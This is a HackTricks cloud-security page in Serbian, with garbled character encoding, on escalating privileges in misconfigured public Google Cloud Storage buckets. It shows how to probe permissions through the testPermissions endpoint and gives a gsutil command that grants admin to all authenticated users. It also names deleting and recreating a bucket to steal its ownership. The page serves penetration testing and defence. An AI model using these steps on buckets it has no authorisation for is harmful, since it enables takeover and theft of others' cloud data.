# GCP - Eskalacija privilegija javnih kanti

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Eskalacija privilegija kanti

Ako je politika kante dozvolila bilo â€œallUsersâ€ ili â€œallAuthenticatedUsersâ€ da **piÅ¡u u svoju politiku kante** (dozvola **storage.buckets.setIamPolicy**)**,** onda bilo ko moÅ¾e da izmeni politiku kante i dodeli sebi pun pristup.

### Proverite dozvole

Postoje 2 naÄina da se provere dozvole nad kantom. Prvi je da ih zatraÅ¾ite slanjem zahteva na `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam` ili pokretanjem `gsutil iam get gs://BUCKET_NAME`.

MeÄ‘utim, ako vaÅ¡ korisnik (potencijalno pripadajuÄ‡i "allUsers" ili "allAuthenticatedUsers") nema dozvole da proÄita iam politiku kante (storage.buckets.getIamPolicy), to neÄ‡e funkcionisati.

Druga opcija koja Ä‡e uvek funkcionisati je koriÅ¡Ä‡enje testPermissions krajnje taÄke kante da biste utvrdili da li imate odreÄ‘enu dozvolu, na primer pristupajuÄ‡i: `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update`

### Eskalacija

Da biste dodelili `Storage Admin` `allAuthenticatedUsers`, moguÄ‡e je pokrenuti:
```bash
gsutil iam ch allAuthenticatedUsers:admin gs://BUCKET_NAME
```
JoÅ¡ jedan napad bi bio da **uklonite kantu i ponovo je kreirate u svom nalogu kako biste ukrali vlasniÅ¡tvo**.

## References

* [https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/](https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
